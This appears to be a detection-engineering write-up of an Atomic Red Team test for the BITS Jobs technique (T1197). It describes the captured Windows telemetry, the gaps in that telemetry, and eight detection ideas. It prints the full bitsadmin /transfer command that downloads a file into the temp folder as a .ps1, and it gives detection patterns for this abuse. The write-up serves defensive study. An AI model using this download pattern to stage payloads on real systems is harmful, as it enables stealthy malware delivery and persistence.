# T1197-1: BITS Jobs — Bitsadmin Download (cmd)

## Technique Context

BITS Jobs (T1197) involves the abuse of Windows Background Intelligent Transfer Service for defense evasion and persistence. BITS is a legitimate Windows service designed for asynchronous file transfers, but attackers leverage it because it operates at low priority to avoid network detection, can survive system reboots, and runs with SYSTEM privileges. The detection community focuses on monitoring BITS job creation, unusual download sources, file staging locations, and the use of BITS utilities like bitsadmin.exe for malicious downloads. This technique is commonly used by APTs and malware families for payload staging and C2 communication.

## What This Dataset Contains

This dataset captures a complete BITS download operation executed via PowerShell spawning cmd.exe and bitsadmin.exe. The process chain shows PowerShell (PID 8228) executing `"cmd.exe" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin1_flag.ps1`, followed by cmd.exe (PID 43140) spawning bitsadmin.exe (PID 7040) with the command line `bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\TEMP\bitsadmin1_flag.ps1`.

Key telemetry includes:
- Sysmon EID 1 events capturing the full process creation chain with command lines
- Security EID 4688 events providing complementary process creation data with token elevation details
- Sysmon EID 7 events showing bitsadmin.exe loading BitsProxy.dll (`C:\Windows\System32\BitsProxy.dll`)
- Sysmon EID 11 events capturing BITS service (svchost.exe PID 39436) creating temporary files (`C:\Windows\Temp\BITCD0.tmp`)
- Process access events (EID 10) showing PowerShell accessing spawned child processes

## What This Dataset Does Not Contain

The dataset lacks several important BITS-related telemetry sources. There are no Microsoft-Windows-Bits-Client/Operational events that would show BITS job lifecycle details, transfer progress, or completion status. Network connection events (Sysmon EID 3) are missing, preventing visibility into the actual HTTP download to GitHub. The final downloaded file `C:\Windows\TEMP\bitsadmin1_flag.ps1` is not captured in file creation events, suggesting the transfer may not have completed during the capture window or was handled by different processes. There are also no BITS WMI events that would provide additional job metadata.

## Assessment

This dataset provides solid process-level detection opportunities for bitsadmin.exe usage patterns, particularly the characteristic command-line syntax and parent-child process relationships. The Sysmon ProcessCreate events with complete command lines offer excellent detection content, and the BitsProxy.dll loading event is a valuable behavioral indicator. However, the lack of BITS-Client logs and network telemetry limits comprehensive analysis of the BITS operation itself. The dataset is most valuable for detecting the initial stages of BITS abuse but less useful for understanding the complete file transfer lifecycle or network-based detection strategies.

## Detection Opportunities Present in This Data

1. **BITS Administration Utility Execution**: Monitor Sysmon EID 1 for bitsadmin.exe process creation, especially with /transfer parameters and external URLs in command lines.

2. **Command Line Pattern Analysis**: Detect Security EID 4688 events with bitsadmin.exe command lines containing /transfer, /priority, and HTTP/HTTPS URLs for external file downloads.

3. **BitsProxy.dll Loading**: Alert on Sysmon EID 7 events showing bitsadmin.exe loading BitsProxy.dll as an indicator of active BITS operations.

4. **Process Chain Analysis**: Monitor for PowerShell spawning cmd.exe which then spawns bitsadmin.exe, indicating potential scripted BITS abuse.

5. **BITS Temporary File Creation**: Track Sysmon EID 11 events where svchost.exe creates files with "BIT*.tmp" patterns in system temporary directories.

6. **Cross-Process Access Patterns**: Correlate Sysmon EID 10 events showing PowerShell processes accessing bitsadmin.exe children with high privileges (0x1FFFFF).

7. **SYSTEM Context BITS Usage**: Flag bitsadmin.exe executions running under NT AUTHORITY\SYSTEM context, which may indicate automated or malicious usage.

8. **External Domain Downloads**: Hunt for bitsadmin.exe command lines containing external domains (non-corporate) as download sources, particularly GitHub, cloud storage, or suspicious domains.
